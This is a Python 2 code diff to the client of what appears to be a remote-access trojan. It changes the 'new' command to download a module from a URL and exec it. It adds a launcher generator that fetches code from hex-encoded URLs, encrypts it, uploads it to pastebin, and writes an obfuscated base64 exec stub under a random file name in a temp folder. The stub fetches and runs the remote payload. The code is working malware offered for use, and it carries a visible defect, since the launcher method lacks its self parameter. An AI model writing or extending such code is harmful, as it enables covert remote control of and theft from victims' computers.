@@ -310,9 +310,8 @@ class Client(object):
     ls.usage		= 'ls <path>'
     wget.usage		= 'wget <url>'
     cd.usage		= 'cd <path>'
-    new.usage		= 'new <url>'
-    cat.usage		= 'cat <file>'
-    unzip.usage         = 'unzip <file>'
+    new.usage           = 'new <option>'
+    unzip.usage		= 'unzip <file>'
     webcam.usage	= 'webcam <mode>'
     set.usage		= 'set <cmd> x=y'
     help.usage		= 'help <option>'
@@ -666,20 +665,23 @@ class Client(object):
             else:
                 return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
-    def _new(self, args):
-        if ' ' in args and args.split()[0] in ('module','update') and args.split()[1].startswith('http'):
-            action = args.split()[0]
-            target = args.split()[1]
+    def _new(self, arg):
+        target, _, value = str(arg).lower().partition(' ')
+        if 'module' in target:
             try:
-                module = self._new_module(target)
-            except Exception as e:
-                return "Error creating new module: '{}'".format(str(e))
-            if action == 'module':
-                return "New module '{}' successfully created".format(str(module.__name__))
-            elif action == 'update':
+                name = os.path.splitext(os.path.basename(value))[0]
+                module = self._new_module(value)
                 exec module in globals()
+                self._modules[name] = module
+            except:
+                return 'Unable to download module'
+        elif 'launcher' in target:
+            try:
+                return self._generate_launcher()
+            except Exception as e:
+                return str(e)
         else:
-            return self.new.func_doc
+            return self.new.usage
 
     def _new_module(self, uri, *kwargs):
         try:
@@ -860,6 +862,39 @@ class Client(object):
             shutdown = threading.Timer(1, self._shutdown)
             shutdown.start()
             exit(0)
+
+    # ------------------- encrypted launcher -------------------------
+
+    def _generate_launcher():
+        if hasattr(self, '__l__') and hasattr(self, '__k__'):
+            template    = self.__k__
+            launcher    = self.__l__
+            adjectives  = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/adjective.list').read().split()]
+            nouns       = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').read().split()]
+            random_var  = lambda: adjectives.pop(adjectives.index(random.choice(adjectives))) + adjectives.pop(adjectives.index(random.choice(adjectives))) + nouns.pop(nouns.index(random.choice(nouns)))
+            code        = urllib2.urlopen(bytes(bytearray.fromhex(hex(long(launcher)).strip('0x').strip('L')))).read()
+            output_file = os.path.join(os.path.expandvars('%TEMP%'), random_var() + '.py') if os.name is 'nt' else os.path.join('/tmp', random_var() + '.py')
+            key         = str().join(random.choice([chr(i) for i in range(48, 123) if chr(i).isalnum()]) for x in range(16))
+            pkg         = {'b64decode':'base64','unpack':'struct','pack':'struct','urlopen':'urllib'}
+            var         = {k: random_var() for k in pkg}
+            imports     = ['from {} import {} as {}'.format(v, k, var[k]) for k,v in pkg.items()]
+            data        = self._pad(code)
+            blocks      = self._block(data)
+            vector      = os.urandom(8)
+            result      = [vector]
+            for block in blocks:
+                encode  = self._xor(vector, block)
+                output  = vector = self._encrypt(encode, key)
+                result.append(output)
+            result      = base64.b64encode(b''.join(result))
+            output      = os.path.split(self._upload_pastebin(result))
+            output      = output[0] + '/raw/' + output[1]
+            target      = bytes(long(output.encode('hex'), 16))
+            framework   = urllib2.urlopen(bytes(bytearray.fromhex(hex(long(template)).strip('0x').strip('L')))).read()
+            with file(output_file, 'w') as fp:
+                fp.write(";".join(imports) + "\n")
+                fp.write("exec(%s(\"%s\"))" % (var['b64decode'], base64.b64encode(framework.replace('__B64__', var['b64decode']).replace('__UNPACK__', var['unpack']).replace('__PACK__', var['pack']).replace('__URLOPEN__', var['urlopen']).replace('__TARGET__', target).replace('__KEY__', key))))
+            return output_file
 
     # ------------------- screenshot -------------------------
 
@@ -1402,3 +1437,7 @@ def main(*args, **kwargs):
         kwargs['f'] = bytes(long(globals()['__file__'].encode('hex'), 16))
     return Client(**kwargs)._start()
 
+
+
+if __name__ == '__main__':
+    main()
